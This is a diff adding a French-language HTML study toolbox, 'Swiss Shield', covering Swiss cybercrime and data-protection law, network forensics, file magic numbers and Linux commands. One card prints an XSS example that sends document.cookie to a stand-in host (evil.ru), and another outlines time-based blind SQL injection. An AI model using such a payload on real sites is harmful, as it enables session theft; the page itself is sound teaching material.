@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>CENTRAL TOOLBOX - SWISS SHIELD</title>
+    <style>
+        :root {
+            --swiss-red: #e61b1b;
+            --law-blue: #2c3e50;
+            --terminal-green: #2ecc71;
+            --forensic-purple: #9b59b6;
+            --warning-orange: #f39c12;
+            --bg: #f4f4f4;
+        }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; padding: 0; display: flex; }
+
+        /* Sidebar */
+        .sidebar { position: fixed; width: 280px; height: 100%; background: var(--law-blue); color: white; padding: 20px; box-sizing: border-box; z-index: 100; overflow-y: auto; }
+        .sidebar h3 { font-size: 13px; color: #7f8c8d; text-transform: uppercase; margin-top: 25px; border-bottom: 1px solid #34495e; padding-bottom: 5px; letter-spacing: 1px; }
+
+        .content { margin-left: 280px; padding: 40px; width: 100%; max-width: 1100px; }
+
+        .header-box { background: white; padding: 25px; border-left: 10px solid var(--swiss-red); box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 30px; }
+        h1 { margin: 0; color: var(--law-blue); text-transform: uppercase; font-size: 26px; }
+
+        .nav-link { display: block; color: #bdc3c7; text-decoration: none; padding: 10px 0; transition: 0.3s; font-size: 13px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .nav-link:hover { color: white; padding-left: 10px; background: rgba(255,255,255,0.05); }
+
+        #searchBar { width: 100%; padding: 15px; margin-bottom: 30px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; box-shadow: inset 0 2px 4px rgba(0,0,0,0.05); }
+
+        .section-content { display: none; }
+        .active-section { display: block; }
+
+        .card { background: white; padding: 20px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ddd; position: relative; }
+        .card-title { font-weight: bold; color: var(--law-blue); font-size: 16px; display: block; margin-bottom: 8px; }
+        .card-text { font-style: italic; color: #555; line-height: 1.5; font-size: 13.5px; }
+
+        .code-block { background: #1e1e1e; color: #dcdcdc; padding: 10px; border-radius: 4px; font-family: 'Consolas', monospace; display: block; margin-top: 8px; font-size: 12.5px; border-left: 3px solid var(--terminal-green); }
+        .magic-val { color: var(--terminal-green); font-weight: bold; }
+
+        .tag { display: inline-block; padding: 3px 8px; background: #eee; border-radius: 4px; font-size: 10px; font-weight: bold; margin-top: 10px; text-transform: uppercase; color: #666; }
+        .tag-red { background: #ffeaea; color: var(--swiss-red); }
+        .tag-green { background: #eafff0; color: var(--terminal-green); }
+        .tag-purple { background: #f3eaff; color: var(--forensic-purple); }
+
+        .external-link { color: var(--swiss-red); text-decoration: none; font-weight: bold; font-size: 12px; display: inline-block; margin-top: 10px; border: 1px solid var(--swiss-red); padding: 5px 10px; border-radius: 4px; transition: 0.3s; margin-right: 10px; }
+        .external-link:hover { background: var(--swiss-red); color: white; }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background: #f8f9fa; color: var(--law-blue); }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <div style="text-align: center; margin-bottom: 20px;">
+            <h2 style="color: white; margin: 0;">SWISS SHIELD</h2>
+            <small style="color: var(--swiss-red)">OFFICIAL TOOLBOX v3.5</small>
+        </div>
+
+        <h3>⚖️ CADRE JURIDIQUE</h3>
+        <a onclick="showSection('cp')" class="nav-link">Code Pénal (Cybercrime)</a>
+        <a onclick="showSection('nlpd')" class="nav-link">Protection des Données (nLPD)</a>
+        <a onclick="showSection('lda')" class="nav-link">Droit d'Auteur (LDA)</a>
+        <a onclick="showSection('ltc')" class="nav-link">Télécommunications (LTC)</a>
+        <a onclick="showSection('lois-sect')" class="nav-link">Lois Sectorielles (LSCPT, ZertES, LB, CO)</a>
+
+        <h3>🔍 INVESTIGATION</h3>
+        <a onclick="showSection('net-for')" class="nav-link">Réseau & Analyse HTTP</a>
+        <a onclick="showSection('sys-for')" class="nav-link">Système & Magic Numbers</a>
+
+        <h3>💻 TERMINAL</h3>
+        <a onclick="showSection('cmd-base')" class="nav-link">Bases & Navigation</a>
+        <a onclick="showSection('cmd-sec')" class="nav-link">Sécurité & Admin</a>
+
+        <a href="MENU_PRINCIPAL.html" style="color: white; background: var(--swiss-red); padding: 12px; border-radius: 5px; text-align: center; margin-top: 30px; display: block; text-decoration: none; font-weight: bold; border: 1px solid white;">← TERMINAL UNIT</a>
+    </div>
+
+    <div class="content">
+        <div class="header-box">
+            <h1 id="section-title">Base de Connaissances</h1>
+            <p>Outils d'aide à l'investigation numérique pour l'Unité Swiss Shield.</p>
+        </div>
+
+        <input type="text" id="searchBar" onkeyup="searchEverything()" placeholder="Rechercher une loi (Art 143), une commande (grep), un code (404) ou un Magic Number (FFD8)...">
+
+        <div id="cp" class="section-content active-section">
+            <div class="card">
+                <span class="card-title">Ressource Officielle : Recueil Systématique</span>
+                <p class="card-text">Consultez l'intégralité du droit interne suisse en vigueur sur le portail Fedlex ou via la documentation locale.</p>
+                <a href="https://www.fedlex.admin.ch/fr/cc/internal-law/1" target="_blank" class="external-link">🌐 Accéder à FEDLEX (Lois Suisses)</a>
+                <a href="CP.pdf" target="_blank" class="external-link">📄 Ouvrir CP.pdf (Local)</a>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 143 CP : Soustraction de données</span>
+                <p class="card-text">"Punit celui qui, dans le dessein de se procurer ou de procurer à un tiers un enrichissement illégitime, aura soustrait des données informatiques qui ne lui appartenaient pas." [cite: 1, 16]</p>
+                <span class="tag tag-red">Soustraction</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 143 bis CP : Accès indu à un système (Piratage / Hacking)</span>
+                <p class="card-text">"Punit l'intrusion sans droit dans un système informatique protégé." Peine maximale encourue : 3 ans. [cite: 7, 45, 63]</p>
+                <span class="tag tag-red">Hacking</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 143 ter CP : Soustraction de données sans dessein d'enrichissement</span>
+                <p class="card-text">Dispositions relatives à l'obtention et à la soustraction de données informatiques spécifiques sans nécessairement viser un profit financier direct. [cite: 16]</p>
+                <span class="tag tag-red">Soustraction</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 144 bis CP : Détérioration de données</span>
+                <p class="card-text">"Punit la modification, l'effacement ou la mise hors d'usage de données sans droit." [cite: 26]</p>
+                <span class="tag tag-red">Malware</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 147 CP : Utilisation frauduleuse d'un ordinateur</span>
+                <p class="card-text">"Profit financier illicite via un processus informatique par l'utilisation de données incorrectes ou incomplètes." [cite: 54]</p>
+                <span class="tag tag-red">Fraude</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 160 CP : Recel de données</span>
+                <p class="card-text">Dispositions juridiques réprimant l'acquisition, la détention, le recel ou la revente de données obtenues de manière illicite par un tiers. [cite: 11]</p>
+                <span class="tag tag-red">Recel</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 179 septies CP : Utilisation abusive d'installations</span>
+                <p class="card-text">"Entraver malicieusement la communication (DDoS, Spam)."</p>
+                <span class="tag tag-red">Entrave</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 179novies CP : Soustraction de données personnelles</span>
+                <p class="card-text">Réprime le fait d'obtenir sans droit des données personnelles qui ne sont pas librement accessibles, à partir d'un système de traitement de données. Distinct de l'Art. 143 CP (soustraction de données au sens général).</p>
+                <span class="tag tag-red">Données personnelles</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 17 CP : État de nécessité (fait justificatif)</span>
+                <p class="card-text">Rend licite un acte qui serait autrement punissable (ex : enregistrer un appel à l'insu d'une personne) lorsqu'il est commis pour préserver un bien juridique d'un danger imminent et impossible à écarter autrement.</p>
+                <span class="tag">Fait justificatif</span>
+            </div>
+        </div>
+
+        <div id="nlpd" class="section-content">
+            <div class="card">
+                <span class="card-title">Ressource Officielle : Protection des Données</span>
+                <p class="card-text">Consultez la documentation relative à la nouvelle loi sur la protection des données (nLPD).</p>
+                <a href="LPD.pdf" target="_blank" class="external-link">📄 Ouvrir LPD.pdf (Local)</a>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 5 nLPD : Définition des données particulièrement sensibles</span>
+                <p class="card-text">Régit la qualification et les exigences de traitement strictes pour les données hautement confidentielles (telles que les opinions politiques, la santé ou les mesures d'aide sociale). [cite: 31, 67]</p>
+                <span class="tag">Compliance</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 7 nLPD : Principes de Privacy by Design et Privacy by Default</span>
+                <p class="card-text">Exige la mise en conformité technique dès la conception et l'application stricte de l'état de la technique (ex: hachage fort SHA256 avec salage) pour assurer la sécurité des données par défaut. [cite: 51, 84, 87]</p>
+                <span class="tag">Architecture</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 25 nLPD : Délai d'exercice du droit d'accès</span>
+                <p class="card-text">Fixe l'obligation d'honorer et de répondre aux demandes d'accès citoyennes dans un délai maximal légal de 30 jours. [cite: 76]</p>
+                <span class="tag">Droits</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 32 nLPD : Droit à l'oubli (Effacement et destruction)</span>
+                <p class="card-text">Fixe le cadre réglementaire concernant l'obligation d'effacement, de purge définitive ou de destruction complète des données devenues caduques. [cite: 78]</p>
+                <span class="tag">Purge</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 60 nLPD : Sanctions et amendes</span>
+                <p class="card-text">Amendes jusqu'à 250 000 CHF à l'encontre des personnes physiques pour violation intentionnelle des devoirs de la nLPD. [cite: 73]</p>
+                <span class="tag">Amendes</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 6 nLPD : Principes (bonne foi, proportionnalité, licéité, transparence)</span>
+                <p class="card-text">Fixe les principes fondamentaux devant régir tout traitement de données : licéité, bonne foi, proportionnalité, exactitude et transparence envers la personne concernée.</p>
+                <span class="tag">Principes</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 9 nLPD : Sous-traitance du traitement</span>
+                <p class="card-text">Fixe les conditions cumulatives permettant de confier un traitement de données à un sous-traitant (garanties de sécurité contractuelles, limitation aux instructions du responsable).</p>
+                <span class="tag">Sous-traitance</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 12 nLPD : Registre des activités de traitement</span>
+                <p class="card-text">Impose la tenue à jour d'un registre recensant toutes les activités de traitement de données personnelles de l'organisation.</p>
+                <span class="tag">Compliance</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 21 al. 2 nLPD : Décision individuelle automatisée</span>
+                <p class="card-text">Droit de la personne concernée d'exiger qu'une décision prise exclusivement sur la base d'un traitement automatisé (profilage, scoring) soit revue par une personne physique.</p>
+                <span class="tag">IA & Profilage</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 22 nLPD : Analyse d'Impact relative à la Protection des Données (AIPD)</span>
+                <p class="card-text">Impose une analyse d'impact préalable lorsqu'un traitement est susceptible d'engendrer un risque élevé pour la personnalité ou les droits fondamentaux de la personne concernée.</p>
+                <span class="tag">Gestion des risques</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 24 nLPD : Notification en cas de violation</span>
+                <p class="card-text">Obligation de notifier dans les meilleurs délais au Préposé fédéral (PFPDT) toute violation de la sécurité des données entraînant un risque élevé pour la personnalité.</p>
+                <span class="tag">Procédure d'urgence</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 26 nLPD (et OLT 3) : Surveillance comportementale des employés</span>
+                <p class="card-text">Interdit la surveillance du comportement des travailleurs sur le lieu de travail (ex : mesure du rendement clavier, reconnaissance faciale liée aux pauses). Seule la surveillance justifiée par la sécurité reste admissible.</p>
+                <span class="tag">Droit du travail</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 28 nLPD : Droit à la portabilité des données</span>
+                <p class="card-text">Droit d'obtenir ou de faire transmettre ses données personnelles dans un format électronique courant, lorsque le traitement repose sur le consentement ou sur l'exécution d'un contrat.</p>
+                <span class="tag">Droits</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 62 nLPD : Violation du devoir de discrétion</span>
+                <p class="card-text">Sanctionne la personne qui divulgue intentionnellement des données personnelles dont elle a eu connaissance dans l'exercice de sa profession, en violation de son obligation de confidentialité.</p>
+                <span class="tag">Amendes</span>
+            </div>
+        </div>
+
+        <div id="lda" class="section-content">
+            <div class="card">
+                <span class="card-title">Ressource Officielle : Droit d'Auteur</span>
+                <p class="card-text">Consultez la législation concernant la protection des œuvres de l'esprit et des logiciels en Suisse.</p>
+                <a href="LDA.pdf" target="_blank" class="external-link">📄 Ouvrir LDA.pdf (Local)</a>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 2 al. 3 LDA : Protection du code informatique</span>
+                <p class="card-text">Protège explicitement les programmes d'ordinateur (code source, infrastructures logicielles) en tant qu'œuvres de l'esprit. [cite: 58]</p>
+                <span class="tag">Propriété Intellectuelle</span>
+            </div>
+            <div class="card">
+                <span class="card-title">DRM (Digital Rights Management) selon la LDA</span>
+                <p class="card-text">Mesures techniques et légales de protection utilisées pour empêcher l'utilisation, la distribution ou la copie non autorisée d'une œuvre protégée. [cite: 38]</p>
+                <span class="tag">Propriété Intellectuelle</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 4c LDA : Recueil d'œuvres</span>
+                <p class="card-text">Protège les recueils constituant, par le choix ou la disposition de leur contenu, des créations de l'esprit à caractère individuel (ex : compilations, bases de données organisées).</p>
+                <span class="tag">Propriété Intellectuelle</span>
+            </div>
+        </div>
+
+        <div id="ltc" class="section-content">
+            <div class="card">
+                <span class="card-title">Ressource Officielle : Loi sur les Télécommunications</span>
+                <p class="card-text">Consultez la législation encadrant les services de télécommunication, la surveillance de la correspondance réseau et la transmission de données.</p>
+                <a href="LTC.pdf" target="_blank" class="external-link">📄 Ouvrir LTC.pdf (Local)</a>
+            </div>
+            <div class="card">
+                <span class="card-title">Cadre Légal de la LTC</span>
+                <p class="card-text">Régit la sécurité des infrastructures de télécommunication et les obligations des fournisseurs d'accès en Suisse.</p>
+                <span class="tag">Réseau</span>
+            </div>
+        </div>
+
+        <div id="lois-sect" class="section-content">
+            <div class="card">
+                <span class="card-title">LSCPT : Surveillance de la correspondance postale et des télécommunications</span>
+                <p class="card-text">Encadre l'utilisation de logiciels d'État (Govware) pour la surveillance des systèmes informatiques dans le cadre de procédures pénales, sous contrôle judiciaire strict.</p>
+                <span class="tag">Surveillance</span>
+            </div>
+            <div class="card">
+                <span class="card-title">ZertES / SCSE : Signature électronique certifiée</span>
+                <p class="card-text">Loi fédérale sur les services de certification dans le domaine de la signature électronique. Définit les conditions de validité juridique d'une signature électronique qualifiée.</p>
+                <span class="tag">Authentification</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 47 LB : Secret professionnel bancaire</span>
+                <p class="card-text">Loi sur les banques — réprime la violation du secret professionnel bancaire par un employé, un mandataire ou un organe d'une banque suisse.</p>
+                <span class="tag">Secteur Bancaire</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Art. 958f CO : Conservation des pièces comptables</span>
+                <p class="card-text">Code des Obligations — impose une durée de conservation minimale de 10 ans pour les livres de comptes et pièces justificatives d'une entreprise.</p>
+                <span class="tag">Droit Commercial</span>
+            </div>
+        </div>
+
+        <div id="net-for" class="section-content">
+            <div class="card">
+                <span class="card-title">Codes de Statut HTTP (Analyse de logs)</span>
+                <table>
+                    <tr><th>Code</th><th>Signification</th><th>Contexte Expert</th></tr>
+                    <tr><td><b>200</b></td><td>OK</td><td>La requête a réussi.</td></tr>
+                    <tr><td><b>301/302</b></td><td>Redirection</td><td>Souvent utilisé pour le phishing (URL cachée).</td></tr>
+                    <tr><td><b>401/403</b></td><td>Non autorisé</td><td>Tentative d'accès à un dossier restreint ou anomalie de sécurité réseau (ex: /admin). [cite: 324]</td></tr>
+                    <tr><td><b>404</b></td><td>Non trouvé</td><td>Peut indiquer un scan de dossiers par un robot.</td></tr>
+                    <tr><td><b>500</b></td><td>Erreur Serveur</td><td>Indique souvent qu'une injection SQL a fait planter le serveur.</td></tr>
+                </table>
+            </div>
+            <div class="card">
+                <span class="card-title">Wireshark & Filtres d'affichage</span>
+                <code class="code-block">http.response.code == 404</code> (Chercher les erreurs d'accès)<br>
+                <code class="code-block">ip.src == [IP_SUSPECTE]</code> (Isoler un attaquant)<br>
+                <code class="code-block">http.request.method == "POST"</code> (Isoler et analyser précisément les requêtes HTTP de type POST)<br>
+                <code class="code-block">udp</code> (Analyser le trafic de paquets sans connexion de la couche Transport)
+            </div>
+            <div class="card">
+                <span class="card-title">Modèle OSI & Protocoles</span>
+                <p class="card-text"><b>Couche 3 (Réseau) :</b> Gère l'adressage IP et le protocole de diagnostic réseau <b>ICMP</b>. [cite: 11, 26]<br>
+                <b>Couche 4 (Transport) :</b> Héberge les protocoles de transmission de données <b>TCP</b> et <b>UDP</b>. [cite: 38]</p>
+                <span class="tag tag-purple">Architecture Réseau</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Ingénierie Réseau & Masques de sous-réseau</span>
+                <p class="card-text"><b>Masque /29 :</b> Permet de calculer le nombre d'hôtes utilisables ($2^{32-29} - 2 = 6$ hôtes disponibles). [cite: 31]<br>
+                <b>Masque en .224 (CIDR /27) :</b> Génère des blocs de sous-réseaux par incréments de 32 adresses (Exemple : base réseau à 192, adresse de diffusion / Broadcast à 223). [cite: 33, 34, 36]</p>
+                <span class="tag tag-purple">Réseau</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Segmentation VLAN (IoT / réseaux locaux)</span>
+                <p class="card-text">Isole un groupe d'appareils (ex : objets connectés) dans un réseau virtuel séparé pour limiter la propagation d'une attaque au reste de l'infrastructure.</p>
+                <span class="tag tag-purple">Réseau</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Blind SQL Injection (Injection SQL aveugle temporelle)</span>
+                <p class="card-text">Technique d'attaque exploitant le temps de réponse d'une requête SQL conditionnelle (ex: <code>CASE WHEN ... THEN RANDOMBLOB(...) ELSE ...</code>) pour déduire des informations sans affichage direct de résultat. Résolution : dérouler chaque condition de la requête dans l'ordre exact du code.</p>
+                <span class="tag tag-purple">Pentest</span>
+            </div>
+        </div>
+
+        <div id="sys-for" class="section-content">
+            <div class="card">
+                <span class="card-title">Magic Numbers (Identification de fichiers réels)</span>
+                <p class="card-text">Les premiers octets (hexadécimal) révèlent le vrai type de fichier, même si l'extension est fausse.</p>
+                <table>
+                    <tr><th>Hexadécimal</th><th>Type réel</th><th>Extension</th></tr>
+                    <tr><td class="magic-val">FF D8 FF</td><td>Image JPEG</td><td>.jpg / .jpeg</td></tr>
+                    <tr><td class="magic-val">89 50 4E 47</td><td>Image PNG</td><td>.png</td></tr>
+                    <tr><td class="magic-val">25 50 44 46</td><td>Document PDF</td><td>.pdf</td></tr>
+                    <tr><td class="magic-val">50 4B 03 04</td><td>Archive ZIP / Office</td><td>.zip / .docx</td></tr>
+                    <tr><td class="magic-val">4D 5A</td><td>Exécutable Windows</td><td>.exe / .dll</td></tr>
+                    <tr><td class="magic-val">7F 45 4C 46</td><td>Exécutable Linux</td><td>.bin / elf</td></tr>
+                </table>
+            </div>
+            <div class="card">
+                <span class="card-title">Intégrité des Preuves (Hachage & Cryptographie)</span>
+                <p class="card-text">Calculer l'empreinte numérique pour prouver l'intégrité absolue d'une preuve ou d'un fichier (ex: segment de hash authentique e3b0c442...). [cite: 52]</p>
+                <code class="code-block">sha256sum preuve.png</code>
+                <span class="tag tag-purple">Forensics</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Analyse Forensique Windows / Linux</span>
+                <p class="card-text"><b>memory.dump :</b> Analyse de l'image de la mémoire vive pour en extraire des structures de données ou des fragments de clés. [cite: 235]<br>
+                <b>Extensions de logs :</b> Le format standard d'analyse des événements système et applicatifs est l'extension <b>.log</b>. [cite: 63]</p>
+                <span class="tag tag-purple">Investigation</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Signatures de Menaces Cyber</span>
+                <p class="card-text"><b>Cross-Site Scripting (XSS) :</b> Injection de balises de script malveillantes visant à dérober les données utilisateur. Exemple : <code style="color: #c0392b;">&lt;script&gt;fetch('https://evil.ru/steal?c='+document.cookie)&lt;/script&gt;</code> [cite: 27, 28]<br>
+                <b>Buffer Overflow (Débordement de tampon) :</b> Faille de mémoire applicative corrigée en C en remplaçant les fonctions de copie non sécurisées par des fonctions bornées. Exemple : <code style="color: #27ae60;">strncpy(buffer, user_input, 64);</code> [cite: 256, 261]</p>
+                <span class="tag tag-red">Vulnérabilités</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Destruction sécurisée (Shredding / Norme DIN 66399)</span>
+                <p class="card-text">Une simple suppression (<code>rm</code>) ne retire que le pointeur du fichier ; les données brutes restent récupérables sur le support. La norme DIN 66399 encadre les niveaux de destruction irréversible des supports numériques et papier.</p>
+                <code class="code-block">shred -u fichier.log</code> (écrase puis supprime définitivement un fichier)
+                <span class="tag tag-purple">Hygiène numérique</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Mémoire d'échange (Swap)</span>
+                <p class="card-text">Espace disque utilisé comme extension de la RAM. Lors d'une purge sécurisée, il faut parfois désactiver puis réactiver le swap pour garantir qu'aucun résidu de donnée sensible n'y subsiste.</p>
+                <code class="code-block">swapoff -a</code> (désactive le swap)<br>
+                <code class="code-block">swapon -a</code> (réactive le swap)
+                <span class="tag tag-purple">Système</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Chiffrement de César</span>
+                <p class="card-text">Chiffrement par substitution où chaque lettre est décalée d'un nombre fixe de rangs dans l'alphabet. Pour déchiffrer, appliquez le décalage inverse (ex : décalage -3 pour un chiffrement +3). Les caractères non alphabétiques (tirets, chiffres) restent généralement inchangés.</p>
+                <span class="tag tag-purple">Cryptographie</span>
+            </div>
+        </div>
+
+        <div id="cmd-base" class="section-content">
+            <div class="card" style="border-left: 5px solid var(--terminal-green);">
+                <span class="card-title">🚀 Mémento Rapide Terminal</span>
+                <p class="card-text">Téléchargez ou ouvrez le guide d'apprentissage et aide-mémoire complet des commandes d'investigation Linux.</p>
+                <a href="memento_linux.pdf" target="_blank" class="external-link" style="border-color: var(--terminal-green); color: var(--terminal-green);">📄 Ouvrir memento_linux.pdf</a>
+            </div>
+            <div class="card">
+                <span class="card-title">Navigation & Exploration basique</span>
+                <code class="code-block">ls</code> (Explorer et lister les fichiers d'un dossier) [cite: 239]<br>
+                <code class="code-block">cat [fichier]</code> (Afficher le contenu textuel brut d'un fichier ou d'un code source) [cite: 240, 241]
+            </div>
+            <div class="card">
+                <span class="card-title">Recherche de contenu</span>
+                <code class="code-block">grep -r "SECRET" /home/user/</code> (Recherche récursive dans tous les dossiers)<br>
+                <code class="code-block">find / -type f -size +100M</code> (Trouver les fichiers de plus de 100 Mo)
+            </div>
+            <div class="card">
+                <span class="card-title">Analyse Hexadécimale (Voir le Magic Number)</span>
+                <code class="code-block">xxd fichier.bin | head</code> (Affiche le contenu brut en hexadécimal)
+            </div>
+        </div>
+
+        <div id="cmd-sec" class="section-content">
+            <div class="card" style="border-left: 5px solid var(--terminal-green);">
+                <span class="card-title">🚀 Mémento Rapide Terminal</span>
+                <p class="card-text">Téléchargez ou ouvrez le guide d'apprentissage et aide-mémoire complet des commandes d'investigation Linux.</p>
+                <a href="memento_linux.pdf" target="_blank" class="external-link" style="border-color: var(--terminal-green); color: var(--terminal-green);">📄 Ouvrir memento_linux.pdf</a>
+            </div>
+            <div class="card">
+                <span class="card-title">Actions Réseau & Diagnostic</span>
+                <code class="code-block">netstat -tulpn</code> (Liste tous les ports ouverts et les programmes liés)<br>
+                <code class="code-block">ss</code> (Afficher de manière moderne l'état des sockets réseau actifs) [cite: 58]<br>
+                <code class="code-block">traceroute [IP]</code> (Cartographier le cheminement et les sauts de paquets vers une cible sous Linux) [cite: 13, 73]<br>
+                <code class="code-block">tracert [IP]</code> (Commande équivalente à traceroute sous les systèmes Windows) [cite: 73]<br>
+                <code class="code-block">nmap -A [IP]</code> (Analyse agressive d'une cible IP)
+            </div>
+            <div class="card">
+                <span class="card-title">Pare-feu & Blocage Réseau</span>
+                <code class="code-block">iptables -A OUTPUT -d [IP] -j DROP</code> (Bloquer de manière permanente le trafic sortant vers une IP malveillante) [cite: 14, 278]
+            </div>
+            <div class="card">
+                <span class="card-title">Contrôle Système & Processus</span>
+                <code class="code-block">ps aux | grep [nom]</code> (Trouver l'ID (PID) d'un programme suspect)<br>
+                <code class="code-block">pstree [utilisateur]</code> (Afficher l'arborescence des processus d'un utilisateur, pour remonter à leur origine)<br>
+                <code class="code-block">lsof</code> (Lister l'ensemble des fichiers ouverts et des sockets actifs par les processus) [cite: 51]<br>
+                <code class="code-block">kill -9 [PID]</code> (Terminer immédiatement et de force un processus malveillant via son PID) [cite: 52]
+            </div>
+            <div class="card">
+                <span class="card-title">Espace disque & Registre Windows (PowerShell)</span>
+                <code class="code-block">df -h</code> (Afficher l'espace disque disponible en format lisible, sous Linux)<br>
+                <code class="code-block">Get-ItemProperty -Path HKLM:\...\Run</code> (Interroger les clés de registre de persistance sous Windows, via PowerShell)
+                <span class="tag tag-purple">Système</span>
+            </div>
+            <div class="card">
+                <span class="card-title">Administration des Utilisateurs & Privilèges</span>
+                <code class="code-block">usermod -L [username]</code> (Verrouiller et neutraliser immédiatement le compte système d'une menace interne) [cite: 19, 298]<br>
+                <code class="code-block">chmod -R [droits] [dossier]</code> (Modifier les permissions de fichiers de façon récursive globale) [cite: 84]
+                <p class="card-text" style="margin-top: 10px; font-size: 12px; color: #7f8c8d;">💡 Note d'architecture : L'UID (User ID) par défaut du super-utilisateur <b>root</b> est toujours <b>0</b>. [cite: 54]</p>
+            </div>
+            <div class="card">
+                <span class="card-title">Requêtes de bases de données (Syntaxe SQL d'investigation)</span>
+                <code class="code-block">show columns from [table];</code> (Lister la structure, les champs et les colonnes d'une table SQL) [cite: 21]<br>
+                <code class="code-block">DELETE FROM [table] WHERE [condition];</code> (Mot-clé de manipulation de données servant à supprimer des enregistrements spécifiques) [cite: 78, 79]
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        function showSection(sectionId) {
+            document.querySelectorAll('.section-content').forEach(s => s.classList.remove('active-section'));
+            document.getElementById(sectionId).classList.add('active-section');
+
+            const titles = {
+                'cp': 'Code Pénal Suisse',
+                'nlpd': 'Protection des Données (nLPD)',
+                'lda': 'Droit d\'Auteur (LDA)',
+                'ltc': 'Loi sur les Télécommunications (LTC)',
+                'lois-sect': 'Lois Sectorielles (LSCPT, ZertES, LB, CO)',
+                'net-for': 'Analyse Réseau & HTTP',
+                'sys-for': 'Forensics & Magic Numbers',
+                'cmd-base': 'Terminal : Navigation',
+                'cmd-sec': 'Terminal : Sécurité'
+            };
+            document.getElementById('section-title').innerText = titles[sectionId];
+        }
+
+        function searchEverything() {
+            let input = document.getElementById('searchBar').value.toLowerCase();
+            let cards = document.getElementsByClassName('card');
+            for (let i = 0; i < cards.length; i++) {
+                if (cards[i].innerText.toLowerCase().includes(input)) {
+                    cards[i].style.display = "";
+                } else {
+                    cards[i].style.display = "none";
+                }
+            }
+        }
+    </script>
+</body>
+</html>
